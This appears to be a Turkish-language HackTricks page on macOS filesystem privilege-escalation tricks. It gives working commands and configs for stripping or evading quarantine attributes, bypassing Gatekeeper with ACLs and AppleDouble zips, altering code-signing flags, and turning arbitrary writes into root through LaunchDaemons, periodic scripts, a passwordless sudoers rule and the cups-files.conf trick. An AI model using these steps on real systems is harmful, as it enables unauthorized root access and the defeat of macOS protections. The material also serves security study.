# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX permissions combinations

Bir **directory** için üç izin biti, normal bir dosyadakinden farklı bir anlama gelir. `chmod(1)`, bir directory için uygulandığında execute bitini "**search**" olarak adlandırır:<sup>[[2]](#references)</sup>

> `0100` Dosyalar için owner tarafından çalıştırmaya izin verir. Directory'ler için owner'ın directory içinde **search** yapmasına izin verir.

- **read** - directory entries'larını enumerate edebilirsiniz (isimleri listeleyebilirsiniz).
- **write** - directory içinde entries **create, rename ve delete** edebilirsiniz. Bunun *containing* directory'nin bir özelliği olduğunu, dosyanın özelliği olmadığını unutmayın: parent directory'ye write edebildiğiniz sürece, okuyamadığınız veya write edemediğiniz bir dosyayı delete edebilirsiniz.
- Bir **subdirectory**'yi delete etmek için boş olması gerekir; bu da içindeki her şeyi kaldırmak için yeterli haklara sahip olmayı gerektirir.
- Directory'de **sticky bit** (`S_ISVTX`, `/tmp` gibi) varsa bu işlem kısıtlanır — POSIX'e göre bir process, dosyanın owner'ı, directory'nin owner'ı olmadığı veya uygun privileges'a sahip olmadığı sürece buradaki dosyaları yalnızca remove veya rename edebilir.<sup>[[1]](#references)</sup>
- **execute / search** - directory'yi **traverse etmenize izin verilir**. Pathname resolution her component'i "predecessor'ı tarafından belirtilen directory içinde" bulur; bu nedenle path prefix'in herhangi bir component'inde **search haklarını kaybetmek**, leaf file'ın kendisi world-readable olsa bile, altındaki her şeyi path üzerinden erişilemez hale getirir.<sup>[[1]](#references)</sup>

### Dangerous Combinations

**root tarafından sahip olunan bir file/folder'ı nasıl overwrite edersiniz**, ancak:

- Path içindeki bir parent **directory owner** kullanıcıdır
- Path içindeki bir parent **directory owner**, **write access** sahibi bir **users group**'tur
- Bir users **group**, **file** üzerinde **write** access'e sahiptir

Önceki kombinasyonlardan herhangi biriyle attacker, privileged arbitrary write elde etmek için beklenen path'e bir **sym/hard link** **inject** edebilir.

### Folder root R+X special case

Bu durum, yukarıdaki pathname-resolution kuralının doğrudan bir sonucudur. Bir **directory** yalnızca root'a R+X veriyorsa, içindeki dosyalara herkes tarafından *path üzerinden* erişilemez — ancak **files' own permission bits** hâlâ permissive olabilir. Arada duran tek şey directory'dir.

Bu nedenle, dosyayı o directory'nin **dışına çıkarmanızı** sağlayan herhangi bir primitive — attacker tarafından seçilmiş bir path'i sizin traverse edebildiğiniz bir konuma **move/rename/copy** eden privileged bir process — dosyanın kendi mode'unu aşmaya hiç gerek kalmadan arbitrary read'e dönüşür:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
Daha düşük ayrıcalıklı bir kullanıcıdan kaynak yolu kabul eden ayrıcalıklı dosya taşıyıcılarını (installer'lar, log rotator'ları, crash/diagnostic collector'lar, backup ve "export" özellikleri) arayın.

## Symbolic Link / Hard Link

### İzinleri geniş dosya/klasör

Ayrıcalıklı bir process, **düşük ayrıcalıklı bir kullanıcı** tarafından **kontrol edilebilen** veya daha önce düşük ayrıcalıklı bir kullanıcı tarafından **oluşturulmuş olabilecek** bir **file** içine veri yazıyorsa. Kullanıcı, dosyayı bir Symbolic veya Hard link aracılığıyla **başka bir dosyaya yönlendirebilir** ve ayrıcalıklı process bu dosyaya yazabilir.

Bir saldırganın **ayrıcalıkları yükseltmek için rastgele bir yazma işlemini kötüye kullanabileceği** diğer bölümlere bakın.

### Open `O_NOFOLLOW`

[`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html)'a göre: *"`O_NOFOLLOW` maskede kullanılırsa ve `open()`'a geçirilen hedef dosya bir symbolic link ise `open()` başarısız olur."* Yalnızca **son** bileşen kontrol edilir — her **ara** bileşen yine çözümlenir ve takip edilir. Bu nedenle `O_NOFOLLOW` ile bir yazma işlemini "koruyan" geliştirici, hedef yolun herhangi bir **üst dizinine** bir symlink yerleştirilerek yine saldırıya uğrayabilir.<sup>[[3]](#references)</sup>

Aynı man page, bu açığı gerçekten kapatan flag'leri belgeler:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *"eğer ... `open()`'a geçirilen yolun herhangi bir bileşeni symbolic link ise `open()` başarısız olur."*
- **`O_RESOLVE_BENEATH`** — *"eğer ... belirtilen path resolution, fd ile ilişkilendirilmiş dizinin dışına çıkarsa `openat()` başarısız olur."*

Aksi hâlde, önceden doğruladığınız bir directory FD'ye göreli `openat()` kullanmak veya `realpath()` + yeniden doğrulama yapmak, yolun ortasında gerçekleştirilen symlink değişimlerini durdurmanın kalan yollarıdır.

## .fileloc

**`.fileloc`** uzantılı dosyalar diğer application'lara veya binary'lere işaret edebilir; bu nedenle açıldıklarında application/binary çalıştırılır.\
Örnek:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Dosya Tanımlayıcıları

### Leak FD (`O_CLOEXEC` yok)

`open` çağrısında `O_CLOEXEC` flag'i yoksa dosya tanımlayıcısı child process tarafından devralınır. Bu nedenle privileged bir process privileged bir dosyayı açar ve attacker tarafından kontrol edilen bir process'i çalıştırırsa attacker **privileged dosyanın FD'sini devralır**.

Bunun canonical örneği **OS X 10.10'daki `DYLD_PRINT_TO_FILE` LPE'sidir** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld`, bu özel değişken `processDyldEnvironmentVariable()` dışında parse edildiği için **restricted (suid root) binary'lerde** bile `DYLD_PRINT_TO_FILE=/path` değerini dikkate aldı.
- `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)` işlemini gerçekleştirdi; böylece **rastgele bir path'te root-owned bir dosya oluşturdu**.
- FD **hiçbir zaman kapatılmadı ve close-on-exec flag'ine sahip değildi**; bu nedenle suid binary'nin her child process'i **root-owned bir dosyaya yazılabilir bir FD** devraldı.
- Örneğin `DYLD_PRINT_TO_FILE=/etc/target suid_binary` çalıştırıp ardından child process'teki devralınan FD numarasını okumak, rastgele root-owned write işlemlerine olanak sağladı; `fcntl(fd, F_SETFL, 0)` ile `O_APPEND` bile temizlenerek append yerine overwrite yapılmasına izin verildi.

Aynı durum, privileged bir process `exec` ile kontrol ettiğiniz bir şeyi çalıştırmadan **önce** bir dosya açtığında da ortaya çıkar (helper tools, `$EDITOR` üzerinden çağrılan `crontab` tarzı editörler, env-var path'inden açılan log/debug dosyaları...). Devraldığınız FD'leri şu komutla listeleyin:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Kendi başınıza açamadığınız bir dosyaya işaret eden `2` üzerindeki her şey, bir arbitrary-write (veya arbitrary-read) primitive'idir.

## quarantine xattrs tricks'lerinden kaçının

### Kaldırın
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Bir dosya/klasör bu immutable attribute'a sahipse üzerine xattr eklemek mümkün olmaz.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### xattr desteğini desteklemeyen dosya sistemleri

macOS'un bağlayabildiği her dosya sistemi **extended attributes**'ı yerel olarak depolamaz. HFS+ ve APFS bunu destekler; **FAT32, exFAT ve (çoğu) NFS mount'u desteklemez** — macOS bunları `._<filename>` adlı bir **AppleDouble** yan dosyasına yazarak emüle eder ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

Bu, quarantine açısından önemlidir; çünkü xattr yalnızca aynı volume üzerinden gerçekten yazılabilir **ve tekrar okunabilirse** varlığını sürdürür:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Birim daha sonra `._` eşlikçi dosyasını yok sayan bir yol üzerinden okunursa (veya eşlikçi dosya kaldırılır/silinirse), dosya **quarantine flag olmadan** gelir — ve quarantine uygulanmamış bir `.app`, [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute) bölümünde ele alındığı üzere App Sandbox'tan kaçmak için yeterlidir.

### writeextattr ACL

Bu ACL, dosyaya `xattrs` eklenmesini engeller.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** dosya formatı, bir dosyayı ACE'leriyle birlikte kopyalar.

[**Kaynak kodunda**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html), **`com.apple.acl.text`** adlı xattr içinde depolanan ACL metin gösteriminin, açılan dosyada ACL olarak ayarlanacağını görmek mümkündür. Bu nedenle, diğer xattr'ların dosyaya yazılmasını engelleyen bir ACL ile bir uygulamayı **AppleDouble** dosya formatını kullanarak bir zip dosyasına sıkıştırırsanız quarantine xattr'ı uygulamaya ayarlanmaz:

Daha fazla bilgi için [**orijinal rapora**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) bakın.<sup>[[6]](#references)</sup>

Bunu tekrarlamak için öncelikle doğru ACL dizesini elde etmemiz gerekir:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Not: Bu çalışsa bile sandbox, quarantine xattr'ını önceden yazar)

Gerçekten gerekli değil ama her ihtimale karşı burada bırakıyorum:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## İmza kontrollerini Bypass etme

### Platform binaries kontrollerini Bypass etme

Bazı security kontrolleri, örneğin bir XPC service'e bağlanmaya izin vermek için binary'nin bir **platform binary** olup olmadığını kontrol eder. Ancak https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ adresinde açıklanan bypass yöntemlerinden birinde gösterildiği üzere, bir platform binary'si (örneğin /bin/ls) edinip exploit'i `DYLD_INSERT_LIBRARIES` env variable'ı üzerinden dyld kullanarak inject ederek bu kontrolü bypass etmek mümkündür.<sup>[[7]](#references)</sup>

### `CS_REQUIRE_LV` ve `CS_FORCED_LV` flag'lerini Bypass etme

Çalışan bir binary'nin aşağıdakine benzer bir code ile kendi flag'lerini değiştirerek kontrolleri bypass etmesi mümkündür:<sup>[[7]](#references)</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Code Signatures Bypass

Bundles, **bundle** içindeki her bir **file**'ın **hash** değerini içeren **`_CodeSignature/CodeResources`** dosyasını barındırır. CodeResources'ın hash değerinin de **executable** içine **embedded** edildiğini unutmayın; dolayısıyla bununla da oynayamayız.

Ancak, imzası kontrol edilmeyecek bazı dosyalar vardır; bunlar plist içinde `omit` anahtarına sahip olan dosyalardır, örneğin:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Bir kaynağın imzasını CLI üzerinden şu şekilde hesaplamak mümkündür:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## dmg'leri Bağlama

Bir kullanıcı, bazı mevcut klasörlerin üzerine bile oluşturduğu özel bir dmg bağlayabilir. Özel içeriklere sahip bir dmg paketi şu şekilde oluşturulabilir:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Genellikle macOS, diski `/usr/libexec/diskarbitrationd` tarafından sağlanan `com.apple.DiskArbitrarion.diskarbitrariond` Mach service ile iletişim kurarak mount eder. LaunchDaemons plist dosyasına `-d` parametresini ekleyip yeniden başlatırsanız, logları `/var/log/diskarbitrationd.log` dosyasına kaydeder.\
Bununla birlikte, `com.apple.driver.DiskImages` kext ile doğrudan iletişim kurmak için `hdik` ve `hdiutil` gibi araçları kullanmak mümkündür.

## Arbitrary Writes

### Periodic sh scripts

Script'iniz bir **shell script** olarak yorumlanabiliyorsa, her gün tetiklenecek **`/etc/periodic/daily/999.local`** shell script'inin üzerine yazabilirsiniz.

Bu script'in çalıştırılmasını şu komutla **fake** edebilirsiniz: **`sudo periodic daily`**

### Daemons

**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** gibi bir **LaunchDaemon** yazarak, aşağıdaki gibi arbitrary bir script çalıştıran plist oluşturabilirsiniz:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Yalnızca root olarak çalıştırmak istediğiniz **komutları** içeren `/Applications/Scripts/privesc.sh` script'ini oluşturun.

### Sudoers File

**arbitrary write** yetkiniz varsa, kendinize **sudo** yetkileri veren bir dosyayı **`/etc/sudoers.d/`** klasörünün içine oluşturabilirsiniz.

### PATH files

**`/etc/paths`** dosyası, PATH env değişkenini oluşturan ana konumlardan biridir. Üzerine yazmak için root olmanız gerekir; ancak **privileged process** içindeki bir script **full path** belirtmeden bir **command** çalıştırıyorsa, bu dosyayı değiştirerek onu **hijack** edebilirsiniz.

Ayrıca `PATH` env değişkenine yeni klasörler yüklemek için **`/etc/paths.d`** içine dosyalar yazabilirsiniz.

### cups-files.conf

Bu teknik [bu writeup](https://www.kandji.io/blog/macos-audit-story-part1) içinde kullanılmıştır.<sup>[[8]](#references)</sup>

Aşağıdaki içeriğe sahip `/etc/cups/cups-files.conf` dosyasını oluşturun:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Bu, `/etc/sudoers.d/lpe` dosyasını 777 izinleriyle oluşturur. Sondaki ekstra gereksiz içerik, error log oluşturulmasını tetiklemek içindir.

Ardından, `%staff ALL=(ALL) NOPASSWD:ALL` gibi privilege escalation için gerekli config'i `/etc/sudoers.d/lpe` dosyasına yazın.

Sonra, yeni sudoers dosyasının `cupsctl` çağrıldığında geçerli olması için `/etc/cups/cups-files.conf` dosyasını tekrar düzenleyerek `LogFilePerm 700` belirtin.

### Sandbox Escape

FS arbitrary write ile macOS sandbox'ından escape etmek mümkündür. Bazı örnekler için [macOS Auto Start](../../../../macos-auto-start-locations.md) sayfasına bakabilirsiniz; ancak yaygın bir yöntem, başlangıçta bir command çalıştıran bir Terminal preferences dosyasını `~/Library/Preferences/com.apple.Terminal.plist` konumuna yazmak ve bunu `open` kullanarak çağırmaktır.

## Diğer kullanıcılar olarak writable dosyalar oluşturma

Çok yaygın bir privesc primitive, **privileged bir process'in kontrol ettiğiniz bir directory içinde sizin için bir dosya oluşturmasını** ve ardından bu dosyaya **write access** sağlamaya devam etmektir. Bunun için iki bileşen gerekir:

1. Sahip olduğunuz bir directory (veya **inheritable ACL** ayarlayabildiğiniz bir directory); böylece içeride oluşturulan her şey izinlerinizi devralır.
2. Bir dosyanın **nerede** oluşturulacağının söylenebildiği privileged/`suid` bir process — genellikle bir debug/logging environment variable, config file veya helper'ın XPC API'si aracılığıyla.

**Inheritable ACL** kısmı, oluşturulan dosyanın başka bir kullanıcıya ait olmasına rağmen sizin tarafınızdan writable olmasını sağlar. `file_inherit` / `directory_inherit` inheritance flag'leri [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) içinde belgelenmiştir:<sup>[[2]](#references)</sup>
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Artık ayrıcalıklı bir process'in `$DIRNAME` içinde oluşturduğu herhangi bir file **sizin tarafınızdan yazılabilir**. Bu directory aynı zamanda daha sonra **root olarak execute edilen** bir konumsa (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, bir LaunchDaemon directory'si...), bu doğrudan bir root escalation'dır. File'a sahip olduktan sonra ne yazmanız gerektiği için yukarıdaki [Sudoers File](#sudoers-file) ve [cups-files.conf](#cups-filesconf) bölümlerine bakın.

"env variable bir root process'inin file oluşturmasını sağlar ve FD size leak olur" zincirinin baştan sona işlendiği bir örnek için yukarıdaki [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) bölümüne bakın.

## POSIX Shared Memory

**POSIX shared memory**, POSIX uyumlu operating system'lerdeki process'lerin ortak bir memory alanına erişmesine olanak tanır ve diğer inter-process communication yöntemlerine kıyasla daha hızlı iletişim sağlar. Bu işlem, `shm_open()` ile bir shared memory object oluşturmayı veya açmayı, boyutunu `ftruncate()` ile ayarlamayı ve `mmap()` kullanarak process'in address space'ine map etmeyi içerir. Process'ler daha sonra bu memory alanını doğrudan okuyabilir ve buraya yazabilir. Eşzamanlı erişimi yönetmek ve data corruption'ı önlemek için mutex veya semaphore gibi synchronization mekanizmaları sıklıkla kullanılır. Son olarak process'ler shared memory'yi `munmap()` ve `close()` ile unmap edip kapatır ve isteğe bağlı olarak memory object'ini `shm_unlink()` ile kaldırır. Bu sistem, birden fazla process'in shared data'ya hızlı ve verimli şekilde erişmesi gereken ortamlarda etkin ve hızlı IPC için özellikle kullanışlıdır.

<details>

<summary>Producer Code Example</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Tüketici Kod Örneği</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors**, kullanıcı uygulamalarındaki **file descriptor operations** işlemlerinin güvenliğini ve güvenilirliğini artırmak amacıyla macOS'ta kullanıma sunulan bir güvenlik özelliğidir. Bu guarded descriptors, file descriptor'larla belirli kısıtlamaları veya kernel tarafından uygulanan "guard"ları ilişkilendirmek için bir yöntem sağlar.

Bu özellik, **unauthorized file access** veya **race conditions** gibi belirli güvenlik açıkları sınıflarını önlemek için özellikle kullanışlıdır. Bu güvenlik açıkları, örneğin bir thread'in bir file description'a erişerek **başka bir vulnerable thread'e erişim sağlaması** veya bir file descriptor'ın **vulnerable child process** tarafından devralınması durumunda ortaya çıkar. Bu işlevsellikle ilgili bazı işlevler şunlardır:

- `guarded_open_np`: Bir guard ile file descriptor açar
- `guarded_close_np`: Kapatır
- `change_fdguard_np`: Bir descriptor üzerindeki guard flags değerlerini değiştirir (guard korumasını kaldırmak da dahil)

## References

- [1] [POSIX.1-2024 — Temel Tanımlar, Bölüm 4 (Dosya Erişim İzinleri, Dizin Koruması, Yol Adı Çözümleme)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man sayfası](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` man sayfası](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company - Hangi dosya sistemleri ve cloud services extended attributes bilgilerini korur?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Gatekeeper'ın Aşil topuğu: Bir macOS güvenlik açığının ortaya çıkarılması](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - macOS Sandbox Escapes için Yeni Bir Dönem](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Apple Güvenlik Açıklarının Ortaya Çıkarılması: diskarbitrationd ve storagekitd Audit Hikayesi, 1. Kısım](https://www.kandji.io/blog/macos-audit-story-part1)
{{#include ../../../../banners/hacktricks-training.md}}
